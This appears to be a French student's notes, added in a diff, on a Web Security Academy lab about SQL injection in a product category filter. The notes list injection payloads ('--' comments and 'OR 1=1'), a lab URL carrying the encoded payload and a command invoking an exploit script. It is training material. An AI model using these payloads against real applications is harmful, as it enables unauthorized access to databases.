@@ -1,0 +1,26 @@
+Disclaimer : De grandes competences necessites de grandes responsabilites , je ne serai en aucun responsable de degats que lutilisation illegale ou non des resources de cette formation 
+
+
+Ce laboratoire contient une vulnérabilité d'injection SQL dans le filtre de la catégorie de produit. Lorsque l'utilisateur sélectionne une catégorie, l'application effectue une requête SQL comme suit:
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+Objectif : effectuez une attaque par injection SQL qui amène l'application à afficher un ou plusieurs produits non libérés.
+
+https://0af200790411b45e838f144400790084.web-security-academy.net/filter?category=Pets
+
+
+Note :
+
+
+SELECT * FROM products WHERE category = 'Pets'' AND released = 1
+
+SELECT * FROM products WHERE category = 'Pets'--' AND released = 1
+
+SELECT * FROM products WHERE category = ''' OR 1 = 1 --
+
+
+ecrire le script : https://0af200790411b45e838f144400790084.web-security-academy.net/filter?category=Pets%27+OR+1=1--
+
+python exploit.py "https://0af200790411b45e838f144400790084.web-security-academy.net" "OR 1=1"
+
